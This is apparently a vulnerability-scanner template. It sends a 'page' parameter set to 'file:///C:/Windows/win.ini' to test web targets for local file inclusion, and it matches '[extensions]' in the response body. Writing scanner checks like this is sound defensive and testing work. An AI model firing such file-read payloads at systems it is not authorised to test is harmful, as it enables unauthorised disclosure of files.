id: lfi5-083
name: 'Wrapper file via page'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via file wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - 'file:///C:/Windows/win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
